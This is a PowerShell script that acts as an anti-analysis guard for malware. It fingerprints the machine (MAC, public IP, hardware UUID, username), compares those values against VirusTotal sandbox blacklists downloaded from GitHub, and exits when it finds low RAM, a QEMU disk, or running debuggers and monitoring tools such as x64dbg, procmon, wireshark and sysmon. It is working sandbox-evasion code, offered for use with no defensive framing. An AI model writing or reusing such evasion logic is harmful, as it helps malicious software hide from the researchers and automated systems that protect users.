function ShowError {
    param([string]$errorName)
    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
}

function Search-Mac {
    $pc_mac = Get-WmiObject win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
    $pc_macs = $pc_mac -join ","
    return $pc_macs
}

function Search-IP {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    return $pc_ip
}

function Search-HWID {
    $hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    return $hwid
}

function Search-Username {
    $pc_username = "$env:username"
    return $pc_username
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )

    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )

    $data = @()
    foreach ($func in $functions) {
        $data += Invoke-Expression "$func"
    }
    foreach ($url in $urls) {
        $blacklist = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($null -ne $blacklist) {
            foreach ($item in $blacklist -split "`n") {
                if ($data -contains $item) {
                    ShowError $item
                    kill $pid -Force  
                }
            }
        }
    }
}

function ram_check {
    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
    if ($ram -lt 4) {
        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
        kill $pid -Force  
    }
}


function VMPROTECT {
	ram_check
    $d = wmic diskdrive get model
    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
        kill $pid -Force   
    }
    $processnames = @(
    "autoruns",
    "autorunsc",
    "die",
    "dumpcap",
    "fakenet",
    "fiddler",
    "filemon",
    "hookexplorer",
    "httpdebugger",
    "idaq",
    "idaq64",
    "immunitydebugger",
    "importrec",
    "joeboxcontrol",
    "joeboxserver",
    "lordpe",
    "ollydbg",
    "petools",
    "proc_analyzer",
    "processhacker",
    "procexp",
    "procmon",
    "qemu-ga",
    "qga",
    "regmon",
    "resourcehacker",
    "sandman",
    "scylla_x64",
    "sniff_hit",
    "sysanalyzer",
    "sysinspector",
    "sysmon",
    "tcpdump",
    "tcpview",
    "tcpview64",
    "vboxcontrol",
    "vboxservice",
    "vboxtray",
    "vmacthlp",
    "vmwareuser",
    "vt-windows-event-stream",
    "windbg",
    "wireshark",
    "x32dbg",
    "x64dbg",
    "xenservice"
    )
    $detectedProcesses = Get-Process -Name $processnames -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
    Write-Output "Detected processes: $($detectedProcesses -join ', ')"
    if ($detectedProcesses -eq $null) {
        Invoke-ANTITOTAL
		Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT !" -ForegroundColor Green
    }
}
VMPROTECT

